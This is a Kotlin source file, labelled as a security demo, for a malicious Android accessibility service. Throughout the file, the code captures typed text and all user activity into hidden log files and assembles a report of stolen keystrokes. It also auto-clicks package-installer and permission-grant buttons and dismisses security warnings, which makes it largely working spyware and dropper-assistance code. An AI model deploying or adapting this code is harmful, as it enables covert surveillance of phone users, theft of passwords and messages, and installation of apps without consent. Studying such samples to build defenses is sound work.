package com.securitydemo.malware.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import com.securitydemo.malware.utils.KeyloggerEngine
import java.io.File

/**
 * SECURITY DEMO: Malicious Accessibility Service
 * 
 * This service demonstrates the most dangerous Android malware technique:
 * - Complete UI automation and control
 * - Keylogging capabilities
 * - Screen content reading
 * - Automatic clicking and gesture simulation
 * - Bypassing user confirmation dialogs
 * - Silent app installation assistance
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows accessibility service abuse
 */
class MaliciousAccessibilityService : AccessibilityService() {

    companion object {
        private const val INSTALL_KEYWORDS = arrayOf(
            "install", "continue", "next", "allow", "permit", "grant", "accept", "ok"
        )
        private const val PACKAGE_INSTALLER = "com.google.android.packageinstaller"
        private const val SETTINGS_APP = "com.android.settings"
    }

    private val handler = Handler(Looper.getMainLooper())
    private var isMonitoringInstallation = false
    private lateinit var keyloggerEngine: KeyloggerEngine

    override fun onServiceConnected() {
        super.onServiceConnected()
        keyloggerEngine = KeyloggerEngine(this)
        logMaliciousActivity("🤖 Accessibility service activated - FULL UI CONTROL GAINED")
        
        // In real malware, this would be silent
        Toast.makeText(this, "Enhanced Accessibility Active", Toast.LENGTH_SHORT).show()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleWindowChanged(event)
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    handleViewClicked(event)
                }
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleTextChanged(event)
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    handleNotificationChanged(event)
                }
            }

            // Log all user interactions for surveillance
            logUserActivity(event)

            // Assist with silent installations
            if (isMonitoringInstallation) {
                assistSilentInstallation(event)
            }

            // Pass event to keylogger engine for keystroke capture
            if (::keyloggerEngine.isInitialized) {
                keyloggerEngine.processAccessibilityEvent(event)
            }

        } catch (e: Exception) {
            // Silently handle errors - typical malware behavior
        }
    }

    private fun handleWindowChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString()
        val className = event.className?.toString()

        logMaliciousActivity("📱 Window changed: $packageName - $className")

        when (packageName) {
            PACKAGE_INSTALLER -> {
                // Package installer opened - prepare for silent installation
                isMonitoringInstallation = true
                logMaliciousActivity("🎯 Package installer detected - preparing UI automation")
                
                // Delay slightly then attempt to automate installation
                handler.postDelayed({ automatePackageInstallation() }, 1000)
            }
            SETTINGS_APP -> {
                // Settings opened - may be permission or accessibility settings
                logMaliciousActivity("⚙️ Settings app opened - monitoring permission changes")
                automatePermissionGranting(event)
            }
            "com.android.systemui" -> {
                // System UI - may be permission dialogs
                automateSystemDialogs(event)
            }
        }
    }

    private fun handleViewClicked(event: AccessibilityEvent) {
        val text = event.text?.toString()
        logMaliciousActivity("👆 User clicked: $text")
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val text = event.text?.toString()
        if (!text.isNullOrEmpty()) {
            // Keylogging capability - capture all text input
            logKeystroke(text)
        }
    }

    private fun handleNotificationChanged(event: AccessibilityEvent) {
        val notification = event.text?.toString()
        logMaliciousActivity("🔔 Notification: $notification")
    }

    /**
     * Core malicious function: Automate package installation
     */
    private fun automatePackageInstallation() {
        try {
            val rootNode = rootInActiveWindow ?: return
            
            logMaliciousActivity("🤖 Automating installation process...")

            // Find and click installation buttons
            val installButtons = findClickableNodes(rootNode, INSTALL_KEYWORDS)
            
            for (button in installButtons) {
                val buttonText = button.text?.toString()?.toLowerCase()
                
                if (buttonText != null && INSTALL_KEYWORDS.any { buttonText.contains(it) }) {
                    logMaliciousActivity("🎯 Auto-clicking: $buttonText")
                    
                    // Simulate click
                    button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    
                    // Also try gesture-based clicking as backup
                    performGestureClick(button)
                    
                    // Wait between clicks
                    Thread.sleep(500)
                }
            }

            // Schedule next automation attempt
            handler.postDelayed({ automatePackageInstallation() }, 2000)

        } catch (e: Exception) {
            logMaliciousActivity("⚠️ Automation error: ${e.message}")
        }
    }

    private fun automatePermissionGranting(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            
            // Look for permission grant buttons
            val permissionButtons = findClickableNodes(rootNode, arrayOf("allow", "grant", "permit", "enable"))
            
            for (button in permissionButtons) {
                logMaliciousActivity("🔓 Auto-granting permission: ${button.text}")
                button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }

        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun automateSystemDialogs(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            
            // Auto-dismiss security warnings
            val dismissButtons = findClickableNodes(rootNode, arrayOf("ok", "allow", "continue", "dismiss"))
            
            for (button in dismissButtons) {
                val text = button.text?.toString()?.toLowerCase()
                if (text?.contains("security") == true || text?.contains("warning") == true) {
                    logMaliciousActivity("🚫 Auto-dismissing security warning: $text")
                    button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
            }

        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun assistSilentInstallation(event: AccessibilityEvent) {
        // This function assists the main installation process
        // by automatically handling any dialogs that appear
        
        val rootNode = rootInActiveWindow ?: return
        
        // Look for any confirmation dialogs and auto-accept them
        val confirmButtons = findClickableNodes(rootNode, arrayOf("install", "continue", "next", "accept"))
        
        confirmButtons.forEach { button ->
            handler.postDelayed({
                try {
                    button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    logMaliciousActivity("✅ Auto-confirmed installation step")
                } catch (e: Exception) {
                    // Silently handle
                }
            }, 1000)
        }
    }

    private fun findClickableNodes(rootNode: AccessibilityNodeInfo, keywords: Array<String>): List<AccessibilityNodeInfo> {
        val clickableNodes = mutableListOf<AccessibilityNodeInfo>()
        
        fun searchNode(node: AccessibilityNodeInfo) {
            // Check if node is clickable and matches keywords
            if (node.isClickable) {
                val text = node.text?.toString()?.toLowerCase()
                val contentDesc = node.contentDescription?.toString()?.toLowerCase()
                
                keywords.forEach { keyword ->
                    if (text?.contains(keyword) == true || contentDesc?.contains(keyword) == true) {
                        clickableNodes.add(node)
                    }
                }
            }
            
            // Recursively search children
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { child ->
                    searchNode(child)
                }
            }
        }
        
        searchNode(rootNode)
        return clickableNodes
    }

    private fun performGestureClick(node: AccessibilityNodeInfo) {
        try {
            val bounds = android.graphics.Rect()
            node.getBoundsInScreen(bounds)
            
            val x = bounds.centerX().toFloat()
            val y = bounds.centerY().toFloat()
            
            val path = Path().apply {
                moveTo(x, y)
            }
            
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
                .build()
            
            dispatchGesture(gesture, null, null)
            
        } catch (e: Exception) {
            // Silently handle gesture errors
        }
    }

    private fun logMaliciousActivity(activity: String) {
        try {
            val logFile = File(filesDir, ".system/accessibility_log.txt")
            logFile.parentFile?.mkdirs()
            
            val timestamp = System.currentTimeMillis()
            val logEntry = "[$timestamp] $activity\n"
            
            logFile.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun logUserActivity(event: AccessibilityEvent) {
        try {
            val activity = "User Activity: ${event.eventType} - ${event.packageName} - ${event.text}"
            
            val logFile = File(filesDir, ".system/user_activity.txt")
            logFile.parentFile?.mkdirs()
            logFile.appendText("${System.currentTimeMillis()}: $activity\n")
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun logKeystroke(text: String) {
        try {
            val logFile = File(filesDir, ".system/keystrokes.txt")
            logFile.parentFile?.mkdirs()
            logFile.appendText("${System.currentTimeMillis()}: $text\n")
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    override fun onInterrupt() {
        logMaliciousActivity("⚠️ Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        isMonitoringInstallation = false
        logMaliciousActivity("🔚 Accessibility service destroyed")
    }

    /**
     * Get comprehensive surveillance report
     */
    fun getSurveillanceReport(): String {
        val report = StringBuilder()
        report.append("=== ACCESSIBILITY SERVICE SURVEILLANCE REPORT ===\n\n")
        
        try {
            val systemDir = File(filesDir, ".system")
            if (systemDir.exists()) {
                
                // Activity logs
                val activityLog = File(systemDir, "accessibility_log.txt")
                if (activityLog.exists()) {
                    report.append("Malicious Activity Log:\n")
                    report.append(activityLog.readText().takeLast(1000)) // Last 1000 chars
                    report.append("\n\n")
                }
                
                // User activity
                val userLog = File(systemDir, "user_activity.txt")
                if (userLog.exists()) {
                    report.append("User Activity Monitoring:\n")
                    report.append(userLog.readText().takeLast(1000))
                    report.append("\n\n")
                }
                
                // Keystroke logs (highly sensitive)
                val keystrokeLog = File(systemDir, "keystrokes.txt")
                if (keystrokeLog.exists()) {
                    report.append("Captured Keystrokes:\n")
                    report.append(keystrokeLog.readText().takeLast(500))
                }
            }
            
        } catch (e: Exception) {
            report.append("Error generating report: ${e.message}")
        }
        
        return report.toString()
    }
}
